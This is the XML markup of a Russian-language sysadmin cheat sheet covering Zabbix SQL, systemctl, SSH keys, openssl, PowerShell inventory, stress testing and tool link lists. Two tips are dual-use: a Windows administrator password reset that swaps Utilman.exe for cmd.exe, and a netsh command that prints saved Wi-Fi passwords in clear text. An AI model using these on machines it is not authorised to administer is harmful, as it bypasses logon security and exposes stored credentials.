      <text:p text:style-name="P1"><text:span text:style-name="T5">Поиск элементов данных указанного хоста: SELECT * FROM items WHERE hostid = '10105';</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Поиск истории значений для указанного элемента данных: SELECT * FROM history WHERE itemid = '24526';</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Удалим всю историю элемента данных до 03.06.2022 (время указано в Unix формате, конвертеры можно найти через поисковик): DELETE FROM history WHERE itemid = '24526' AND clock &lt; '1654041600';</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Удаление всей истории данных до 03.06.2022: DELETE FROM history WHERE clock &lt; '1654041600';</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SELECT * FROM `hosts` WHERE host="Template ICMP Ping";</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">UPDATE items SET delay=3600 WHERE hostid=10105 AND delay=600;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">UPDATE items SET trends=180 WHERE hostid=10047 AN</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Шпаргалка по часто используемым командам systemctl:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Посмотреть статус службы. Покажет статус службы на примере сети network - systemctl status network</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">2. Запустить сервис. Запустит сервис баз данных на примере mysql - systemctl start mysql</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Остановить службу. Остановит сервис времени ntpd - systemctl stop ntpd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Перезапустить службу. Перезапустит веб-сервер nginx - systemctl restart nginx</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Включить автозапуск службы. Разрешит автозапуск веб-сервера apache - systemctl enable apache</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. Отключить автозапуск службы. Запретит автозапуск брандмауэра firewalld - systemctl disable firewalld</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. Выполнить команду на удаленной системе. Остановит cron на компьютере с IP-адресом 192.168.0.15, подключившись под учетной записью root - systemctl --host root@192.168.0.15 stop cron</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8. Перезагрузить сервер. Перезагрузит локальный сервер - systemctl reboot</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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14"><text:span text:style-name="T5">Generating public/private rsa key pair.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Created directory '/root/.ssh'.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Enter same passphrase again: &lt;-- ENTER</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Your identification has been saved in /root/.ssh/id_rsa.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin yes - Вход под root по ssh разрешен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin no - Вход под root по ssh запрещен.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Конвертация PFX в CRT и KEY. Для ECDSA:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.key -nodes -nocerts</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.crt -nokeys</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Если pfx запаролен, будет запрошен Import Password.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Для RSA:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">openssl pkcs12 -in certificate_RSA.pfx -clcerts -nokeys -out certificate_RSA.crt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">openssl pkcs12 -in certificate_RSA.pfx -nocerts -out certificate_RSA-encrypted.key</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">openssl rsa -in certificate_RSA-encrypted.key -out certificate_RSA.key</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1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14"><text:span text:style-name="T5">Паттерн для поиска IPv4 адресов, соответствует всем значениям от 0.0.0.0to 999.999.999.999и в большинстве случаев этого бывает достаточно: "([0-9]{1,3}[\.]){3}[0-9]{1,3}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Найти Все IP Адреса с Помощью Grep. Пропарсим файл и найдем в нем все IP адреса из диапазона от 0.0.0.0до 999.999.999.999с помощью grep: $ grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Поиск Правильных IPv4 Адресов. Регулярное выражение для поиска и проверки правильных IPv4 адресов: "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Поиск IPv6 Адресов. Регулярное выражение для проверки IPv6 адреса: "((^|:)([0-9a-fA-F]{0,4})){1,8}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">TCPKeepAlive yes</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ClientAliveInterval 300</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ClientAliveCountMax 60</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как ускорить навигацию командной строки? Повторный запуск под root - sudo !!</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">user@host: cat /var/log/messages</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">cat /var/log/messages: Permission denied.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как не надо: Вверх. Влево. Влево. Влево. …. sudo Enter. Рррр.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как надо: sudo !!</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Повторный ввод последнего аргумента - Alt+. Вы захотели еще раз воспользоваться только что написанным аргументом? Например, созданной директорией?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как не надо: mkdir MyNewDirectory; cd MyNewDirectory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как надо: mkdir MyNewDirectory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">cd &lt;Alt+.&gt;</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">Как не надо: Вверх. Вверх. Вверх. Enter.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Как надо: Ctrl+R. Просто нажмите Ctrl+R и введите первые буквы нужной команды.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как не надо: cd /var/www/foo</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как надо: cd -</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">user@host: jobs</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">[1] Stopped vim</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">-n : Задает максимальное количество итераций.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">-b : Работа в пакетном режиме (Запуск команды top в пакетном режиме для перенаправления вывода в другие программы или в файл)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">-d : Интервал задержки (Задает задержку между обновлениями экрана)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">0-59/5 5 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Открываем "CMD" от имени Администратора. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Вводим команду netsh wlan show profiles (Будет выведены все сети, к которым вы подключались)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Выбираем нужную и вводим netsh wlan show profile name="Имя_сети" key=clear</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">"Имя сети" - название нужного Wi-Fi. Если имя сети состоит из двух слов, то возьмите их в кавычки. </text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Система покажет всю информацию про эту сеть, в том числе и пароль.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Установим stress на Ubuntu и Debian: sudo apt install stress</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Синтаксис stress: stress [OPTION [ARG]]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Следующая команда будет непрерывно загружать 4 ядра процессора: stress --cpu 4</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память: [simterm] $ stress -v N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или –io: stress -i N или stress --io N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом: # stress --io 100</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Если вы выполните эту команду без каких-либо аргументов, то она покажет дисковые IO для всех доступных дисков: iostat -d /dev/vda -d /dev/vdb 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Увеличение нагрузки на диск. Опция -d или –hdd используется для создания нагрузки на диск: stress -d N или stress --hdd N</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Для увеличения нагрузки на диск мы используем следующую команду: stress --hdd 100</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Посмотрим пропускную способность диска с помощью команды vmstat: vmstat 1 100</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1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14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Работа с архивами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Создать .tar.gz:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tar -czvf file.tar.gz /full/path - создать .tar.gz (архив)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tar -cjvf file.tar.bz2 /full/path - создать .tar.bz2 (архив)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Распаковать .tar: tar -xvf file.tar.gz</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Распаковать gz: gunzip yourfile.gz</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Распаковать многотомный архив: 7za x arch.7z.001</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Получить листинг файлов в архиве: tar -tf &lt;path_to_tarfile&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Скопировать файл на сервер: scp -P 12322 file.tar login@111.111.111.111:/home/user</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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text:span text:style-name="T5">4 - В выборе действия нажимает Диагностика.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду: echo %windir%</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6 - Команда выведет системный диск. Переходим в него: C:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7 - В случае, если диск C является системным. Далее переходим в System32: cd Windows\System32</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8 - Далее переименовываем Utilman.exe на Utilman.exe.old: ren Utilman.exe Utilman.exe.old</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">9 - Выполняем замену cmd на Utilman.exe: copy cmd.exe Utilman.exe</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Полезные команды Linux. Атрибуты файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chattr +a file - Разрешает только добавление данных в файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chattr +d file - Игнорировать данный файл при создании резервной копии с помощью программы dump</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chattr +c file - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chattr +i file1 - Защита файла от каких либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">chattr +S file1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды sync</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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1"><text:span text:style-name="T5">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2"><text:span text:style-name="T5">lsattr - Листинг файлов с атрибутами</text:span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">Get-ChildItem -Path $env:ProgramFiles -Recurse -Include *.exe |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Where-Object -FilterScript {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>($_.LastWriteTime -gt '2005-10-01') -and ($_.Length -ge 1mb) -and ($_.Length -le 10mb)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Копирование файлов и папок. Копирование выполняется с помощью командлета Copy-Item. Следующая команда создает резервную копию скрипта профиля PowerShell:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">if (Test-Path -Path $PROFILE) {</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak')</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if (Test-Path -Path $PROFILE) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak') -Force</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><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1"><text:span text:style-name="T5">PowerShell скрипты для сбора информации о компьютерах:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Собираем сведения о рабочих столах локального компьютера:Get-CimInstance -ClassName Win32_Desktop</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вывод сведений о BIOS: Get-CimInstance -ClassName Win32_BIOS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Вывод сведений о процессоре:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SystemType</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">----------</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">X86-based PC</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Получить данные поставщика вычислительной техники (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Список установленных исправлений: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Перечисление сведений о версии операционной системы:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Общие сведения о локальных пользователях:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Получение доступного места на диске:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Получение сведений о сеансе входа: Get-CimInstance -ClassName Win32_LogonSession</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">Отобразить пользователя, вошедшего в определенную компьютерную систему: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Отображение состояния службы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_Service |</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Get-CimInstance -ClassName Win32_Service |</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Лайфхаки по работе с формулами в Excel. В Excel есть множество удивительных лайфхаков для работы с формулами. Вот некоторые из них:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Подборка ChatGPT расширений для браузера. Часть 2:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Gist AI <text:s/>(https://www.gistai.tech/?utm_source=tool_directory&amp;utm_medium=post&amp;utm_campaign=launch) - бесплатный саммерайзер для веб-сайтов, YouTube и PDF на базе ChatGPT;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">2. AI Character GPT (https://chromewebstore.google.com/detail/ai-character-for-gpt/daoeioifimkjegafelcaljboknjkkohh) - для создания ИИ-ботов в пару кликов на базе ChatGPT или Bard;</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">3. ShareGPT (https://sharegpt.com/) - расширение, позволяющие делиться промтами с другими пользователями ИИ;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. AI Promt Genius (https://chromewebstore.google.com/detail/ai-prompt-genius/jjdnakkfjnnbbckhifcfchagnpofjffo) - для создания качественных промтов и улучшения существующих;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><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1"><text:span text:style-name="T5">1. Сетевые модели, часть 1. Эталонная сетевая модель OSI. (https://infocisco.ru/network_model_osi.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Сетевые модели, часть 2. Сетевая модель TCP/IP или DOD. (https://infocisco.ru/network_model_tcpip.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Сетевые модели, часть 3. Инкапсуляция, декапсуляция, данные, пакеты, фреймы, биты, PDU. (https://infocisco.ru/network_model_encapsulation_pdu.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Сетевые устройства. Различие роутера от маршрутизатора, от моста, от коммутатора. (https://infocisco.ru/network_devices.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Работа сетевых устройств, отражение работ на сетевой эталонной модели OSI. (https://infocisco.ru/works_network_devices.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. CCNA 3 на русском. Ответы, перевод, объяснения. (https://infocisco.ru/answers_ccna_3.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">8. Статическая маршрутизация. (https://infocisco.ru/cheatsheet_static_routing.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">9. Динамическая маршрутизация. Протокол RIPv2. (https://infocisco.ru/cheatsheet_dinamic_routing_protocol_rip.html)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">10. Cisco CCNA: Деление сети на подсети (PDF). Пример деления сети. (https://infocisco.ru/cs_subnetting.html)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Онлайн инструменты проверки подозрительных писем, ссылок и файлов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">3. Is Legit? <text:s/>(https://www.islegitsite.com/) - популярный анти-скам реестр среди зарубежных сайтов. Можно проверить сайт на предмет подозрительности. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Hardenize (https://www.hardenize.com/) - выдает отчет безопасности по любому сайту: HTTPS, информация о домене, данные почты, протоколы и т.д.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Virus Total <text:s/>(https://www.virustotal.com/gui/home/upload) - самый популярный он-лайн антивирус. Проверяет файлы и ссылки. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. MetaDefender Cloud (https://t.me/KladovkaPavlu/534) - мощный анти-вирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:span></text:p>
      <text:p text:style-name="P1"><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text:span text:style-name="T5">8. Dr. Web (https://t.me/KladovkaPavlu/84)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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Определяем контент, созданный нейросетями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Content at Scale (https://contentatscale.ai/ai-image-detector/?fpr=ddiy&amp;fp_sid=aiiamgedetect) - определит картинку, сгенерированную ИИ;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">6. GPTZero (https://t.me/KladovkaPavlu/1540) - определяет текст, написанный любыми популярными моделями;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">7. AI Content Detector (https://crossplag.com/ai-content-detector/) - сайт с говорящим названием, тоже определяет текст.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1 - Создайте группу: sudo groupadd sudousers</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2 - Добавьте учетную запись(и) в группу:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo usermod -a -G sudousers user1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">sudo usermod -a -G sudousers user2</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">sudo usermod -a -G sudousers <text:s/>…</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Вам нужно будет сделать это для каждой учетной записи на вашем сервере, которой нужны привилегии sudo.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3 - Создайте резервную копию файла конфигурации sudo /etc/sudoers: sudo cp --archive /etc/sudoers /etc/sudoers-COPY-$(date +"%Y%m%d%H%M%S")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4 - Отредактируйте файл конфигурации sudo /etc/sudoers: sudo visudo</text:span></text:p>
      <text:p text:style-name="P2"><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1"><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span></text:p>
